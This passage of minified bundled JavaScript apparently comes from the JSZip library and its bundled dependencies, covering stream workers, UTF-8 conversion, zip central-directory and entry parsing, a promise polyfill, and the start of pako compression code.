a(o){this.name=o||"default",this.streamInfo={},this.generatedError=null,this.extraStreamInfo={},this.isPaused=!0,this.isFinished=!1,this.isLocked=!1,this._listeners={data:[],end:[],error:[]},this.previous=null}a.prototype={push:function(o){this.emit("data",o)},end:function(){if(this.isFinished)return!1;this.flush();try{this.emit("end"),this.cleanUp(),this.isFinished=!0}catch(o){this.emit("error",o)}return!0},error:function(o){return!this.isFinished&&(this.isPaused?this.generatedError=o:(this.isFinished=!0,this.emit("error",o),this.previous&&this.previous.error(o),this.cleanUp()),!0)},on:function(o,n){return this._listeners[o].push(n),this},cleanUp:function(){this.streamInfo=this.generatedError=this.extraStreamInfo=null,this._listeners=[]},emit:function(o,n){if(this._listeners[o])for(var d=0;d<this._listeners[o].length;d++)this._listeners[o][d].call(this,n)},pipe:function(o){return o.registerPrevious(this)},registerPrevious:function(o){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.streamInfo=o.streamInfo,this.mergeStreamInfo(),this.previous=o;var n=this;return o.on("data",function(d){n.processChunk(d)}),o.on("end",function(){n.end()}),o.on("error",function(d){n.error(d)}),this},pause:function(){return!this.isPaused&&!this.isFinished&&(this.isPaused=!0,this.previous&&this.previous.pause(),!0)},resume:function(){if(!this.isPaused||this.isFinished)return!1;var o=this.isPaused=!1;return this.generatedError&&(this.error(this.generatedError),o=!0),this.previous&&this.previous.resume(),!o},flush:function(){},processChunk:function(o){this.push(o)},withStreamInfo:function(o,n){return this.extraStreamInfo[o]=n,this.mergeStreamInfo(),this},mergeStreamInfo:function(){for(var o in this.extraStreamInfo)Object.prototype.hasOwnProperty.call(this.extraStreamInfo,o)&&(this.streamInfo[o]=this.extraStreamInfo[o])},lock:function(){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.isLocked=!0,this.previous&&this.previous.lock()},toString:function(){var o="Worker "+this.name;return this.previous?this.previous+" -> "+o:o}},r.exports=a},{}],29:[function(t,r,s){var a=t("../utils"),o=t("./ConvertWorker"),n=t("./GenericWorker"),d=t("../base64"),u=t("../support"),h=t("../external"),c=null;if(u.nodestream)try{c=t("../nodejs/NodejsStreamOutputAdapter")}catch{}function p(m,g){return new h.Promise(function(y,b){var _=[],x=m._internalType,I=m._outputType,z=m._mimeType;m.on("data",function(M,O){_.push(M),g&&g(O)}).on("error",function(M){_=[],b(M)}).on("end",function(){try{var M=(function(O,j,P){switch(O){case"blob":return a.newBlob(a.transformTo("arraybuffer",j),P);case"base64":return d.encode(j);default:return a.transformTo(O,j)}})(I,(function(O,j){var P,H=0,K=null,E=0;for(P=0;P<j.length;P++)E+=j[P].length;switch(O){case"string":return j.join("");case"array":return Array.prototype.concat.apply([],j);case"uint8array":for(K=new Uint8Array(E),P=0;P<j.length;P++)K.set(j[P],H),H+=j[P].length;return K;case"nodebuffer":return Buffer.concat(j);default:throw new Error("concat : unsupported type '"+O+"'")}})(x,_),z);y(M)}catch(O){b(O)}_=[]}).resume()})}function v(m,g,y){var b=g;switch(g){case"blob":case"arraybuffer":b="uint8array";break;case"base64":b="string"}try{this._internalType=b,this._outputType=g,this._mimeType=y,a.checkSupport(b),this._worker=m.pipe(new o(b)),m.lock()}catch(_){this._worker=new n("error"),this._worker.error(_)}}v.prototype={accumulate:function(m){return p(this,m)},on:function(m,g){var y=this;return m==="data"?this._worker.on(m,function(b){g.call(y,b.data,b.meta)}):this._worker.on(m,function(){a.delay(g,arguments,y)}),this},resume:function(){return a.delay(this._worker.resume,[],this._worker),this},pause:function(){return this._worker.pause(),this},toNodejsStream:function(m){if(a.checkSupport("nodestream"),this._outputType!=="nodebuffer")throw new Error(this._outputType+" is not supported by this method");return new c(this,{objectMode:this._outputType!=="nodebuffer"},m)}},r.exports=v},{"../base64":1,"../external":6,"../nodejs/NodejsStreamOutputAdapter":13,"../support":30,"../utils":32,"./ConvertWorker":24,"./GenericWorker":28}],30:[function(t,r,s){if(s.base64=!0,s.array=!0,s.string=!0,s.arraybuffer=typeof ArrayBuffer<"u"&&typeof Uint8Array<"u",s.nodebuffer=typeof Buffer<"u",s.uint8array=typeof Uint8Array<"u",typeof ArrayBuffer>"u")s.blob=!1;else{var a=new ArrayBuffer(0);try{s.blob=new Blob([a],{type:"application/zip"}).size===0}catch{try{var o=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);o.append(a),s.blob=o.getBlob("application/zip").size===0}catch{s.blob=!1}}}try{s.nodestream=!!t("readable-stream").Readable}catch{s.nodestream=!1}},{"readable-stream":16}],31:[function(t,r,s){for(var a=t("./utils"),o=t("./support"),n=t("./nodejsUtils"),d=t("./stream/GenericWorker"),u=new Array(256),h=0;h<256;h++)u[h]=252<=h?6:248<=h?5:240<=h?4:224<=h?3:192<=h?2:1;u[254]=u[254]=1;function c(){d.call(this,"utf-8 decode"),this.leftOver=null}function p(){d.call(this,"utf-8 encode")}s.utf8encode=function(v){return o.nodebuffer?n.newBufferFrom(v,"utf-8"):(function(m){var g,y,b,_,x,I=m.length,z=0;for(_=0;_<I;_++)(64512&(y=m.charCodeAt(_)))==55296&&_+1<I&&(64512&(b=m.charCodeAt(_+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),_++),z+=y<128?1:y<2048?2:y<65536?3:4;for(g=o.uint8array?new Uint8Array(z):new Array(z),_=x=0;x<z;_++)(64512&(y=m.charCodeAt(_)))==55296&&_+1<I&&(64512&(b=m.charCodeAt(_+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),_++),y<128?g[x++]=y:(y<2048?g[x++]=192|y>>>6:(y<65536?g[x++]=224|y>>>12:(g[x++]=240|y>>>18,g[x++]=128|y>>>12&63),g[x++]=128|y>>>6&63),g[x++]=128|63&y);return g})(v)},s.utf8decode=function(v){return o.nodebuffer?a.transformTo("nodebuffer",v).toString("utf-8"):(function(m){var g,y,b,_,x=m.length,I=new Array(2*x);for(g=y=0;g<x;)if((b=m[g++])<128)I[y++]=b;else if(4<(_=u[b]))I[y++]=65533,g+=_-1;else{for(b&=_===2?31:_===3?15:7;1<_&&g<x;)b=b<<6|63&m[g++],_--;1<_?I[y++]=65533:b<65536?I[y++]=b:(b-=65536,I[y++]=55296|b>>10&1023,I[y++]=56320|1023&b)}return I.length!==y&&(I.subarray?I=I.subarray(0,y):I.length=y),a.applyFromCharCode(I)})(v=a.transformTo(o.uint8array?"uint8array":"array",v))},a.inherits(c,d),c.prototype.processChunk=function(v){var m=a.transformTo(o.uint8array?"uint8array":"array",v.data);if(this.leftOver&&this.leftOver.length){if(o.uint8array){var g=m;(m=new Uint8Array(g.length+this.leftOver.length)).set(this.leftOver,0),m.set(g,this.leftOver.length)}else m=this.leftOver.concat(m);this.leftOver=null}var y=(function(_,x){var I;for((x=x||_.length)>_.length&&(x=_.length),I=x-1;0<=I&&(192&_[I])==128;)I--;return I<0||I===0?x:I+u[_[I]]>x?I:x})(m),b=m;y!==m.length&&(o.uint8array?(b=m.subarray(0,y),this.leftOver=m.subarray(y,m.length)):(b=m.slice(0,y),this.leftOver=m.slice(y,m.length))),this.push({data:s.utf8decode(b),meta:v.meta})},c.prototype.flush=function(){this.leftOver&&this.leftOver.length&&(this.push({data:s.utf8decode(this.leftOver),meta:{}}),this.leftOver=null)},s.Utf8DecodeWorker=c,a.inherits(p,d),p.prototype.processChunk=function(v){this.push({data:s.utf8encode(v.data),meta:v.meta})},s.Utf8EncodeWorker=p},{"./nodejsUtils":14,"./stream/GenericWorker":28,"./support":30,"./utils":32}],32:[function(t,r,s){var a=t("./support"),o=t("./base64"),n=t("./nodejsUtils"),d=t("./external");function u(g){return g}function h(g,y){for(var b=0;b<g.length;++b)y[b]=255&g.charCodeAt(b);return y}t("setimmediate"),s.newBlob=function(g,y){s.checkSupport("blob");try{return new Blob([g],{type:y})}catch{try{var b=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);return b.append(g),b.getBlob(y)}catch{throw new Error("Bug : can't construct the Blob.")}}};var c={stringifyByChunk:function(g,y,b){var _=[],x=0,I=g.length;if(I<=b)return String.fromCharCode.apply(null,g);for(;x<I;)y==="array"||y==="nodebuffer"?_.push(String.fromCharCode.apply(null,g.slice(x,Math.min(x+b,I)))):_.push(String.fromCharCode.apply(null,g.subarray(x,Math.min(x+b,I)))),x+=b;return _.join("")},stringifyByChar:function(g){for(var y="",b=0;b<g.length;b++)y+=String.fromCharCode(g[b]);return y},applyCanBeUsed:{uint8array:(function(){try{return a.uint8array&&String.fromCharCode.apply(null,new Uint8Array(1)).length===1}catch{return!1}})(),nodebuffer:(function(){try{return a.nodebuffer&&String.fromCharCode.apply(null,n.allocBuffer(1)).length===1}catch{return!1}})()}};function p(g){var y=65536,b=s.getTypeOf(g),_=!0;if(b==="uint8array"?_=c.applyCanBeUsed.uint8array:b==="nodebuffer"&&(_=c.applyCanBeUsed.nodebuffer),_)for(;1<y;)try{return c.stringifyByChunk(g,b,y)}catch{y=Math.floor(y/2)}return c.stringifyByChar(g)}function v(g,y){for(var b=0;b<g.length;b++)y[b]=g[b];return y}s.applyFromCharCode=p;var m={};m.string={string:u,array:function(g){return h(g,new Array(g.length))},arraybuffer:function(g){return m.string.uint8array(g).buffer},uint8array:function(g){return h(g,new Uint8Array(g.length))},nodebuffer:function(g){return h(g,n.allocBuffer(g.length))}},m.array={string:p,array:u,arraybuffer:function(g){return new Uint8Array(g).buffer},uint8array:function(g){return new Uint8Array(g)},nodebuffer:function(g){return n.newBufferFrom(g)}},m.arraybuffer={string:function(g){return p(new Uint8Array(g))},array:function(g){return v(new Uint8Array(g),new Array(g.byteLength))},arraybuffer:u,uint8array:function(g){return new Uint8Array(g)},nodebuffer:function(g){return n.newBufferFrom(new Uint8Array(g))}},m.uint8array={string:p,array:function(g){return v(g,new Array(g.length))},arraybuffer:function(g){return g.buffer},uint8array:u,nodebuffer:function(g){return n.newBufferFrom(g)}},m.nodebuffer={string:p,array:function(g){return v(g,new Array(g.length))},arraybuffer:function(g){return m.nodebuffer.uint8array(g).buffer},uint8array:function(g){return v(g,new Uint8Array(g.length))},nodebuffer:u},s.transformTo=function(g,y){if(y=y||"",!g)return y;s.checkSupport(g);var b=s.getTypeOf(y);return m[b][g](y)},s.resolve=function(g){for(var y=g.split("/"),b=[],_=0;_<y.length;_++){var x=y[_];x==="."||x===""&&_!==0&&_!==y.length-1||(x===".."?b.pop():b.push(x))}return b.join("/")},s.getTypeOf=function(g){return typeof g=="string"?"string":Object.prototype.toString.call(g)==="[object Array]"?"array":a.nodebuffer&&n.isBuffer(g)?"nodebuffer":a.uint8array&&g instanceof Uint8Array?"uint8array":a.arraybuffer&&g instanceof ArrayBuffer?"arraybuffer":void 0},s.checkSupport=function(g){if(!a[g.toLowerCase()])throw new Error(g+" is not supported by this platform")},s.MAX_VALUE_16BITS=65535,s.MAX_VALUE_32BITS=-1,s.pretty=function(g){var y,b,_="";for(b=0;b<(g||"").length;b++)_+="\\x"+((y=g.charCodeAt(b))<16?"0":"")+y.toString(16).toUpperCase();return _},s.delay=function(g,y,b){setImmediate(function(){g.apply(b||null,y||[])})},s.inherits=function(g,y){function b(){}b.prototype=y.prototype,g.prototype=new b},s.extend=function(){var g,y,b={};for(g=0;g<arguments.length;g++)for(y in arguments[g])Object.prototype.hasOwnProperty.call(arguments[g],y)&&b[y]===void 0&&(b[y]=arguments[g][y]);return b},s.prepareContent=function(g,y,b,_,x){return d.Promise.resolve(y).then(function(I){return a.blob&&(I instanceof Blob||["[object File]","[object Blob]"].indexOf(Object.prototype.toString.call(I))!==-1)&&typeof FileReader<"u"?new d.Promise(function(z,M){var O=new FileReader;O.onload=function(j){z(j.target.result)},O.onerror=function(j){M(j.target.error)},O.readAsArrayBuffer(I)}):I}).then(function(I){var z=s.getTypeOf(I);return z?(z==="arraybuffer"?I=s.transformTo("uint8array",I):z==="string"&&(x?I=o.decode(I):b&&_!==!0&&(I=(function(M){return h(M,a.uint8array?new Uint8Array(M.length):new Array(M.length))})(I))),I):d.Promise.reject(new Error("Can't read the data of '"+g+"'. Is it in a supported JavaScript type (String, Blob, ArrayBuffer, etc) ?"))})}},{"./base64":1,"./external":6,"./nodejsUtils":14,"./support":30,setimmediate:54}],33:[function(t,r,s){var a=t("./reader/readerFor"),o=t("./utils"),n=t("./signature"),d=t("./zipEntry"),u=t("./support");function h(c){this.files=[],this.loadOptions=c}h.prototype={checkSignature:function(c){if(!this.reader.readAndCheckSignature(c)){this.reader.index-=4;var p=this.reader.readString(4);throw new Error("Corrupted zip or bug: unexpected signature ("+o.pretty(p)+", expected "+o.pretty(c)+")")}},isSignature:function(c,p){var v=this.reader.index;this.reader.setIndex(c);var m=this.reader.readString(4)===p;return this.reader.setIndex(v),m},readBlockEndOfCentral:function(){this.diskNumber=this.reader.readInt(2),this.diskWithCentralDirStart=this.reader.readInt(2),this.centralDirRecordsOnThisDisk=this.reader.readInt(2),this.centralDirRecords=this.reader.readInt(2),this.centralDirSize=this.reader.readInt(4),this.centralDirOffset=this.reader.readInt(4),this.zipCommentLength=this.reader.readInt(2);var c=this.reader.readData(this.zipCommentLength),p=u.uint8array?"uint8array":"array",v=o.transformTo(p,c);this.zipComment=this.loadOptions.decodeFileName(v)},readBlockZip64EndOfCentral:function(){this.zip64EndOfCentralSize=this.reader.readInt(8),this.reader.skip(4),this.diskNumber=this.reader.readInt(4),this.diskWithCentralDirStart=this.reader.readInt(4),this.centralDirRecordsOnThisDisk=this.reader.readInt(8),this.centralDirRecords=this.reader.readInt(8),this.centralDirSize=this.reader.readInt(8),this.centralDirOffset=this.reader.readInt(8),this.zip64ExtensibleData={};for(var c,p,v,m=this.zip64EndOfCentralSize-44;0<m;)c=this.reader.readInt(2),p=this.reader.readInt(4),v=this.reader.readData(p),this.zip64ExtensibleData[c]={id:c,length:p,value:v}},readBlockZip64EndOfCentralLocator:function(){if(this.diskWithZip64CentralDirStart=this.reader.readInt(4),this.relativeOffsetEndOfZip64CentralDir=this.reader.readInt(8),this.disksCount=this.reader.readInt(4),1<this.disksCount)throw new Error("Multi-volumes zip are not supported")},readLocalFiles:function(){var c,p;for(c=0;c<this.files.length;c++)p=this.files[c],this.reader.setIndex(p.localHeaderOffset),this.checkSignature(n.LOCAL_FILE_HEADER),p.readLocalPart(this.reader),p.handleUTF8(),p.processAttributes()},readCentralDir:function(){var c;for(this.reader.setIndex(this.centralDirOffset);this.reader.readAndCheckSignature(n.CENTRAL_FILE_HEADER);)(c=new d({zip64:this.zip64},this.loadOptions)).readCentralPart(this.reader),this.files.push(c);if(this.centralDirRecords!==this.files.length&&this.centralDirRecords!==0&&this.files.length===0)throw new Error("Corrupted zip or bug: expected "+this.centralDirRecords+" records in central dir, got "+this.files.length)},readEndOfCentral:function(){var c=this.reader.lastIndexOfSignature(n.CENTRAL_DIRECTORY_END);if(c<0)throw this.isSignature(0,n.LOCAL_FILE_HEADER)?new Error("Corrupted zip: can't find end of central directory"):new Error("Can't find end of central directory : is this a zip file ? If it is, see https://stuk.github.io/jszip/documentation/howto/read_zip.html");this.reader.setIndex(c);var p=c;if(this.checkSignature(n.CENTRAL_DIRECTORY_END),this.readBlockEndOfCentral(),this.diskNumber===o.MAX_VALUE_16BITS||this.diskWithCentralDirStart===o.MAX_VALUE_16BITS||this.centralDirRecordsOnThisDisk===o.MAX_VALUE_16BITS||this.centralDirRecords===o.MAX_VALUE_16BITS||this.centralDirSize===o.MAX_VALUE_32BITS||this.centralDirOffset===o.MAX_VALUE_32BITS){if(this.zip64=!0,(c=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR))<0)throw new Error("Corrupted zip: can't find the ZIP64 end of central directory locator");if(this.reader.setIndex(c),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR),this.readBlockZip64EndOfCentralLocator(),!this.isSignature(this.relativeOffsetEndOfZip64CentralDir,n.ZIP64_CENTRAL_DIRECTORY_END)&&(this.relativeOffsetEndOfZip64CentralDir=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.relativeOffsetEndOfZip64CentralDir<0))throw new Error("Corrupted zip: can't find the ZIP64 end of central directory");this.reader.setIndex(this.relativeOffsetEndOfZip64CentralDir),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.readBlockZip64EndOfCentral()}var v=this.centralDirOffset+this.centralDirSize;this.zip64&&(v+=20,v+=12+this.zip64EndOfCentralSize);var m=p-v;if(0<m)this.isSignature(p,n.CENTRAL_FILE_HEADER)||(this.reader.zero=m);else if(m<0)throw new Error("Corrupted zip: missing "+Math.abs(m)+" bytes.")},prepareReader:function(c){this.reader=a(c)},load:function(c){this.prepareReader(c),this.readEndOfCentral(),this.readCentralDir(),this.readLocalFiles()}},r.exports=h},{"./reader/readerFor":22,"./signature":23,"./support":30,"./utils":32,"./zipEntry":34}],34:[function(t,r,s){var a=t("./reader/readerFor"),o=t("./utils"),n=t("./compressedObject"),d=t("./crc32"),u=t("./utf8"),h=t("./compressions"),c=t("./support");function p(v,m){this.options=v,this.loadOptions=m}p.prototype={isEncrypted:function(){return(1&this.bitFlag)==1},useUTF8:function(){return(2048&this.bitFlag)==2048},readLocalPart:function(v){var m,g;if(v.skip(22),this.fileNameLength=v.readInt(2),g=v.readInt(2),this.fileName=v.readData(this.fileNameLength),v.skip(g),this.compressedSize===-1||this.uncompressedSize===-1)throw new Error("Bug or corrupted zip : didn't get enough information from the central directory (compressedSize === -1 || uncompressedSize === -1)");if((m=(function(y){for(var b in h)if(Object.prototype.hasOwnProperty.call(h,b)&&h[b].magic===y)return h[b];return null})(this.compressionMethod))===null)throw new Error("Corrupted zip : compression "+o.pretty(this.compressionMethod)+" unknown (inner file : "+o.transformTo("string",this.fileName)+")");this.decompressed=new n(this.compressedSize,this.uncompressedSize,this.crc32,m,v.readData(this.compressedSize))},readCentralPart:function(v){this.versionMadeBy=v.readInt(2),v.skip(2),this.bitFlag=v.readInt(2),this.compressionMethod=v.readString(2),this.date=v.readDate(),this.crc32=v.readInt(4),this.compressedSize=v.readInt(4),this.uncompressedSize=v.readInt(4);var m=v.readInt(2);if(this.extraFieldsLength=v.readInt(2),this.fileCommentLength=v.readInt(2),this.diskNumberStart=v.readInt(2),this.internalFileAttributes=v.readInt(2),this.externalFileAttributes=v.readInt(4),this.localHeaderOffset=v.readInt(4),this.isEncrypted())throw new Error("Encrypted zip are not supported");v.skip(m),this.readExtraFields(v),this.parseZIP64ExtraField(v),this.fileComment=v.readData(this.fileCommentLength)},processAttributes:function(){this.unixPermissions=null,this.dosPermissions=null;var v=this.versionMadeBy>>8;this.dir=!!(16&this.externalFileAttributes),v==0&&(this.dosPermissions=63&this.externalFileAttributes),v==3&&(this.unixPermissions=this.externalFileAttributes>>16&65535),this.dir||this.fileNameStr.slice(-1)!=="/"||(this.dir=!0)},parseZIP64ExtraField:function(){if(this.extraFields[1]){var v=a(this.extraFields[1].value);this.uncompressedSize===o.MAX_VALUE_32BITS&&(this.uncompressedSize=v.readInt(8)),this.compressedSize===o.MAX_VALUE_32BITS&&(this.compressedSize=v.readInt(8)),this.localHeaderOffset===o.MAX_VALUE_32BITS&&(this.localHeaderOffset=v.readInt(8)),this.diskNumberStart===o.MAX_VALUE_32BITS&&(this.diskNumberStart=v.readInt(4))}},readExtraFields:function(v){var m,g,y,b=v.index+this.extraFieldsLength;for(this.extraFields||(this.extraFields={});v.index+4<b;)m=v.readInt(2),g=v.readInt(2),y=v.readData(g),this.extraFields[m]={id:m,length:g,value:y};v.setIndex(b)},handleUTF8:function(){var v=c.uint8array?"uint8array":"array";if(this.useUTF8())this.fileNameStr=u.utf8decode(this.fileName),this.fileCommentStr=u.utf8decode(this.fileComment);else{var m=this.findExtraFieldUnicodePath();if(m!==null)this.fileNameStr=m;else{var g=o.transformTo(v,this.fileName);this.fileNameStr=this.loadOptions.decodeFileName(g)}var y=this.findExtraFieldUnicodeComment();if(y!==null)this.fileCommentStr=y;else{var b=o.transformTo(v,this.fileComment);this.fileCommentStr=this.loadOptions.decodeFileName(b)}}},findExtraFieldUnicodePath:function(){var v=this.extraFields[28789];if(v){var m=a(v.value);return m.readInt(1)!==1||d(this.fileName)!==m.readInt(4)?null:u.utf8decode(m.readData(v.length-5))}return null},findExtraFieldUnicodeComment:function(){var v=this.extraFields[25461];if(v){var m=a(v.value);return m.readInt(1)!==1||d(this.fileComment)!==m.readInt(4)?null:u.utf8decode(m.readData(v.length-5))}return null}},r.exports=p},{"./compressedObject":2,"./compressions":3,"./crc32":4,"./reader/readerFor":22,"./support":30,"./utf8":31,"./utils":32}],35:[function(t,r,s){function a(m,g,y){this.name=m,this.dir=y.dir,this.date=y.date,this.comment=y.comment,this.unixPermissions=y.unixPermissions,this.dosPermissions=y.dosPermissions,this._data=g,this._dataBinary=y.binary,this.options={compression:y.compression,compressionOptions:y.compressionOptions}}var o=t("./stream/StreamHelper"),n=t("./stream/DataWorker"),d=t("./utf8"),u=t("./compressedObject"),h=t("./stream/GenericWorker");a.prototype={internalStream:function(m){var g=null,y="string";try{if(!m)throw new Error("No output type specified.");var b=(y=m.toLowerCase())==="string"||y==="text";y!=="binarystring"&&y!=="text"||(y="string"),g=this._decompressWorker();var _=!this._dataBinary;_&&!b&&(g=g.pipe(new d.Utf8EncodeWorker)),!_&&b&&(g=g.pipe(new d.Utf8DecodeWorker))}catch(x){(g=new h("error")).error(x)}return new o(g,y,"")},async:function(m,g){return this.internalStream(m).accumulate(g)},nodeStream:function(m,g){return this.internalStream(m||"nodebuffer").toNodejsStream(g)},_compressWorker:function(m,g){if(this._data instanceof u&&this._data.compression.magic===m.magic)return this._data.getCompressedWorker();var y=this._decompressWorker();return this._dataBinary||(y=y.pipe(new d.Utf8EncodeWorker)),u.createWorkerFrom(y,m,g)},_decompressWorker:function(){return this._data instanceof u?this._data.getContentWorker():this._data instanceof h?this._data:new n(this._data)}};for(var c=["asText","asBinary","asNodeBuffer","asUint8Array","asArrayBuffer"],p=function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},v=0;v<c.length;v++)a.prototype[c[v]]=p;r.exports=a},{"./compressedObject":2,"./stream/DataWorker":27,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31}],36:[function(t,r,s){(function(a){var o,n,d=a.MutationObserver||a.WebKitMutationObserver;if(d){var u=0,h=new d(m),c=a.document.createTextNode("");h.observe(c,{characterData:!0}),o=function(){c.data=u=++u%2}}else if(a.setImmediate||a.MessageChannel===void 0)o="document"in a&&"onreadystatechange"in a.document.createElement("script")?function(){var g=a.document.createElement("script");g.onreadystatechange=function(){m(),g.onreadystatechange=null,g.parentNode.removeChild(g),g=null},a.document.documentElement.appendChild(g)}:function(){setTimeout(m,0)};else{var p=new a.MessageChannel;p.port1.onmessage=m,o=function(){p.port2.postMessage(0)}}var v=[];function m(){var g,y;n=!0;for(var b=v.length;b;){for(y=v,v=[],g=-1;++g<b;)y[g]();b=v.length}n=!1}r.exports=function(g){v.push(g)!==1||n||o()}}).call(this,typeof Lt<"u"?Lt:typeof self<"u"?self:typeof window<"u"?window:{})},{}],37:[function(t,r,s){var a=t("immediate");function o(){}var n={},d=["REJECTED"],u=["FULFILLED"],h=["PENDING"];function c(b){if(typeof b!="function")throw new TypeError("resolver must be a function");this.state=h,this.queue=[],this.outcome=void 0,b!==o&&g(this,b)}function p(b,_,x){this.promise=b,typeof _=="function"&&(this.onFulfilled=_,this.callFulfilled=this.otherCallFulfilled),typeof x=="function"&&(this.onRejected=x,this.callRejected=this.otherCallRejected)}function v(b,_,x){a(function(){var I;try{I=_(x)}catch(z){return n.reject(b,z)}I===b?n.reject(b,new TypeError("Cannot resolve promise with itself")):n.resolve(b,I)})}function m(b){var _=b&&b.then;if(b&&(typeof b=="object"||typeof b=="function")&&typeof _=="function")return function(){_.apply(b,arguments)}}function g(b,_){var x=!1;function I(O){x||(x=!0,n.reject(b,O))}function z(O){x||(x=!0,n.resolve(b,O))}var M=y(function(){_(z,I)});M.status==="error"&&I(M.value)}function y(b,_){var x={};try{x.value=b(_),x.status="success"}catch(I){x.status="error",x.value=I}return x}(r.exports=c).prototype.finally=function(b){if(typeof b!="function")return this;var _=this.constructor;return this.then(function(x){return _.resolve(b()).then(function(){return x})},function(x){return _.resolve(b()).then(function(){throw x})})},c.prototype.catch=function(b){return this.then(null,b)},c.prototype.then=function(b,_){if(typeof b!="function"&&this.state===u||typeof _!="function"&&this.state===d)return this;var x=new this.constructor(o);return this.state!==h?v(x,this.state===u?b:_,this.outcome):this.queue.push(new p(x,b,_)),x},p.prototype.callFulfilled=function(b){n.resolve(this.promise,b)},p.prototype.otherCallFulfilled=function(b){v(this.promise,this.onFulfilled,b)},p.prototype.callRejected=function(b){n.reject(this.promise,b)},p.prototype.otherCallRejected=function(b){v(this.promise,this.onRejected,b)},n.resolve=function(b,_){var x=y(m,_);if(x.status==="error")return n.reject(b,x.value);var I=x.value;if(I)g(b,I);else{b.state=u,b.outcome=_;for(var z=-1,M=b.queue.length;++z<M;)b.queue[z].callFulfilled(_)}return b},n.reject=function(b,_){b.state=d,b.outcome=_;for(var x=-1,I=b.queue.length;++x<I;)b.queue[x].callRejected(_);return b},c.resolve=function(b){return b instanceof this?b:n.resolve(new this(o),b)},c.reject=function(b){var _=new this(o);return n.reject(_,b)},c.all=function(b){var _=this;if(Object.prototype.toString.call(b)!=="[object Array]")return this.reject(new TypeError("must be an array"));var x=b.length,I=!1;if(!x)return this.resolve([]);for(var z=new Array(x),M=0,O=-1,j=new this(o);++O<x;)P(b[O],O);return j;function P(H,K){_.resolve(H).then(function(E){z[K]=E,++M!==x||I||(I=!0,n.resolve(j,z))},function(E){I||(I=!0,n.reject(j,E))})}},c.race=function(b){var _=this;if(Object.prototype.toString.call(b)!=="[object Array]")return this.reject(new TypeError("must be an array"));var x=b.length,I=!1;if(!x)return this.resolve([]);for(var z=-1,M=new this(o);++z<x;)O=b[z],_.resolve(O).then(function(j){I||(I=!0,n.resolve(M,j))},function(j){I||(I=!0,n.reject(M,j))});var O;return M}},{immediate:36}],38:[function(t,r,s){var a={};(0,t("./lib/utils/common").assign)(a,t("./lib/deflate"),t("./lib/inflate"),t("./lib/zlib/constants")),r.exports=a},{"./lib/deflate":39,"./lib/inflate":40,"./lib/utils/common":41,"./lib/zlib/constants":44}],39:[function(t,r,s){var a=t("./zlib/deflate"),o=t("./utils/common"),n=t("./utils/strings"),d=t("./zlib/messages"),u=t("./zlib/zstream"),h=Object.prototype.toString,c=0,p=-1,v=0,m=8;function g(b){if(!(this instanceof g))return new g(b);this.options=o.assign({level:p,method:m,chunkSize:16384,windowBits:15,memLevel:8,strategy:v,to:""},b||{});var _=this.options;_.raw&&0<_.windowBits?_.windowBits=-_.windowBits:_.gzip&&0<_.windowBits&&_.windowBits<16&&(_.windowBits+=16),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new u,this.strm.avail_out=0;var x=a.deflateInit2(this.strm,_.level,_.method,_.windowBits,_.memLevel,_.strategy);if(x!==c)throw new Error(d[x]);if(_.header&&a.deflateSetHeader(this.strm,_.header),_.dictionary){var I;if(I=typeof _.dictionary=="string"?n.string2buf(_.dictionary):h.call(_.dictionary)==="[object ArrayBuffer]"?new Uint8Array(_.dictionary):_.dictionary,(x=a.deflateSetDictionary(this.strm,I))!==c)throw new Error(d[x]);this._dict_set=!0}}function y(b,_){var x=new g(_);if(x.push(b,!0),x.err)throw x.msg||d[x.err];return x.result}g.prototype.push=function(b,_){var x,I,z=this.strm,M=this.options.chunkSize;if(this.ended)return!1;I=_===~~_?_:_===!0?4:0,typeof b=="string"?z.input=n.string2buf(b):h.call(b)==="[object ArrayBuffer]"?z.input=new Uint8Array(b):z.input=b,z.next_in=0,z.avail_in=z.input.length;do{if(z.avail_out===0&&(z.output=new o.Buf8(M),z.next_out=0,z.avail_out=M),(x=a.deflate(z,I))!==1&&x!==c)return this.onEnd(x),!(this.ended=!0);z.avail_out!==0&&(z.avail_in!==0||I!==4&&I!==2)||(this.options.to==="string"?this.onData(n.buf2binstring(o.shrinkBuf(z.output,z.next_out))):this.onData(o.shrinkBuf(z.output,z.next_out)))}while((0<z.avail_in||z.avail_out===0)&&x!==1);return I===4?(x=a.deflateEnd(this.strm),this.onEnd(x),this.ended=!0,x===c):I!==2||(this.onEnd(c),!(z.avail_out=0))},g.prototype.onData=function(b){this.chunks.push(b)},g.prototype.onEnd=function(b){b===c&&(this.options.to==="string"?this.result=this.chunks.join(""):this.result=o.flattenChunks(this.chunks)),this.chunks=[],this.err=b,this.msg=this.strm.msg},s.Deflate=g,s.deflate=y,s.deflateRaw=function(b,_){return(_=_||{}).raw=!0,y(b,_)},s.gzip=function(b,_){return(_=_||{}).gzip=!0,y(b,_)}},{"./utils/common":41,"./utils/strings":42,"./zlib/deflate":46,"./zlib/messages":51,"./zlib/zstream":53}],40:[function(t,r,s){var a=t("./zlib/inflate"),o=t("./utils/common"),n=t("./utils/strings"),d=t("./zlib/constants"),u=t("./zlib/messages"),h=t("./zlib/zstream"),c=t("./zlib/gzheader"),p=Object.prototype.toString;function v(g){if(!(this instanceof v))return new v(g);this.options=o.assign({chunkSize:16384,windowBits:0,to:""},g||{});var y=this.options;y.raw&&0<=y.windowBits&&y.windowBits<16&&(y.windowBits=-y.windowBits,y.windowBits===0&&(y.windowBits=-15)),!(0<=y.windowBits&&y.windowBits<16)||g&&g.windowBits||(y.windowBits+=32),15<y.windowBits&&y.windowBits<48&&(15&y.windowBits)==0&&(y.windowBits|=15),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new h,this.strm.avail_out=0;var 